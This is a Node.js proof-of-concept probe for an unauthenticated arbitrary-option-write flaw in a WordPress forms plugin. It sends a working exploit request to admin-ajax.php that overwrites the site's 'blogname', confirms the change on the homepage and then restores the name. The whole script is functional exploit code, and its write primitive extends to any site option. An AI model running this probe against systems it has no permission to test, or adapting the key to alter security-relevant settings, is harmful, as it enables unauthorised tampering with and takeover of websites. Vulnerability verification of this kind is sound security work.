#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90003
// "Old Forms <= 1.4.2 - Unauthenticated Arbitrary Options Update"
//
// The plugin registers an unauthenticated AJAX action `of_save_field`
// (wp_ajax_nopriv_of_save_field) that calls:
//     update_option( $_POST['key'], $_POST['value'] )
// with no capability check and no restriction on which option key can be
// written. This probe confirms exploitability by using that endpoint to
// overwrite the `blogname` option with a unique marker, then checking
// that the site's homepage <title> reflects the marker (proving an
// unauthenticated, arbitrary option write occurred). It then restores
// the original blogname.
//
// Usage: node probe.mjs <base-url>
// Exit 0 => vulnerable/exploitable. Exit 1 => not vulnerable (appears fixed).

const baseUrl = process.argv[2];

if (!baseUrl) {
	console.error('Usage: node probe.mjs <base-url>');
	process.exit(1);
}

const base = baseUrl.replace(/\/+$/, '');
const ajaxUrl = `${base}/wp-admin/admin-ajax.php`;

function extractTitle(html) {
	const m = /<title>([^<]*)<\/title>/i.exec(html);
	return m ? m[1] : null;
}

async function callSaveField(key, value) {
	const body = new URLSearchParams({
		action: 'of_save_field',
		key,
		value,
	});
	let res;
	try {
		res = await fetch(ajaxUrl, {
			method: 'POST',
			headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
			body: body.toString(),
		});
	} catch (err) {
		return { ok: false, error: err };
	}
	let json = null;
	try {
		json = await res.json();
	} catch {
		// non-JSON response; treat as failure to parse but keep status
	}
	return { ok: res.ok, status: res.status, json };
}

async function getHomepageTitle() {
	const res = await fetch(`${base}/`, { method: 'GET' });
	const html = await res.text();
	return extractTitle(html);
}

async function main() {
	// 1. Capture the original blogname (via the homepage title) so we can
	//    restore it afterward, where practical.
	let originalTitle;
	try {
		originalTitle = await getHomepageTitle();
	} catch (err) {
		console.error('Failed to fetch homepage before probing:', err.message || err);
		process.exit(1);
	}

	// 2. Attempt the unauthenticated arbitrary option write.
	const marker = `OF_PROBE_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
	const writeResult = await callSaveField('blogname', marker);

	if (!writeResult.ok || !writeResult.json || writeResult.json.success !== true) {
		// The AJAX action either doesn't exist, requires auth/nonce now, or
		// otherwise rejected the request -> treat as not vulnerable.
		console.log(
			'of_save_field did not accept the unauthenticated write (status=' +
				writeResult.status +
				'); target appears NOT vulnerable.'
		);
		process.exit(1);
	}

	// 3. Verify the write actually took effect by checking the public
	//    homepage title reflects the injected marker.
	let newTitle;
	try {
		newTitle = await getHomepageTitle();
	} catch (err) {
		console.error('Failed to fetch homepage after probing:', err.message || err);
		process.exit(1);
	}

	const exploitable = newTitle !== null && newTitle.includes(marker);

	// 4. Best-effort restoration of the original option value.
	if (originalTitle !== null) {
		try {
			await callSaveField('blogname', originalTitle);
		} catch {
			// best effort only
		}
	}

	if (exploitable) {
		console.log(
			'VULNERABLE: unauthenticated of_save_field request overwrote the ' +
				"'blogname' option (homepage title changed to injected marker)."
		);
		process.exit(0);
	}

	console.log(
		'NOT VULNERABLE: unauthenticated of_save_field request did not change ' +
			"the 'blogname' option as expected."
	);
	process.exit(1);
}

main().catch((err) => {
	console.error('Unexpected error:', err && err.stack ? err.stack : err);
	process.exit(1);
});
